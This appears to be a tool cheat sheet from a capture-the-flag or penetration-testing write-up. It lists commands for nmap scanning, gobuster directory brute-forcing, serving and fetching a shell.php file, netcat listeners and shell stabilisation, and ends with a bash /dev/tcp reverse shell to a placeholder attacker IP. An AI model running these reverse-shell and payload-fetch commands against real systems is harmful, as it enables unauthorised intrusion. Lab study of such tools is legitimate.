## Tool Footprint

---

#### nmap

`nmap - Network exploration tool and security / port scanner`
```
nmap -sC -sV <Target IP>
```
>-sC: equivalent to --script=default

>-sV: Probe open ports to determine service/version info

---

#### gobuster
`gobuster - Directory/file & DNS busting tool written in Go`
```
gobuster dir -u http://<Target IP> -w /usr/share/wordlists/dirb/big.txt
```
```
gobuster dir -u http://<Target VHost> -w /usr/share/wordlists/dirb/big.txt
```
> dir - the classic directory brute-forcing mode

>-u, --url string  

> -w, --wordlist string

---

#### python (server)

`python - an interpreted, interactive, object‐oriented programming language`

```
python3 -m http.server 5555
```

>-m module‐name
>>Searches sys.path for the named module and runs the corresponding .py file as a script.   
This terminates the option list (following options are passed as arguments to the module).

---

#### wget

`Wget - The non-interactive network downloader.`

```
wget http://IP:5555/shell.php
```

>Syntax: wget [option]... [URL]...

---

#### netcat

`nc - TCP/IP swiss army knife`
```
netcat -lvnp 4444
```
```
netcat -lvnp 1234
```
> -l    listen mode, for inbound connects

> -v     verbose [use twice to be more verbose]

> -n     numeric‐only IP addresses, no DNS

> -p    port
>>local port number (port numbers can be individual or ranges: lo‐hi [inclusive])

---
#### script

`script - make typescript of terminal session `

```
/usr/bin/script -qc /bin/bash /dev/null
```

> -q, --quiet
>>Be quiet (do not write start and done messages to standard output).


> -c, --command command
>> Run the command rather than an interactive shell.    
This makes it easy for a script to capture the output of a program that behaves differently when its stdout is not a tty.

---
#### bash 

`bash - GNU Bourne‐Again SHell `

```
bash -l >& /dev/tcp/<ATTACK MACHINE IP>/<PORT> 0>&1
```

> -l -> Make bash act as if it had been invoked as a login shell


---
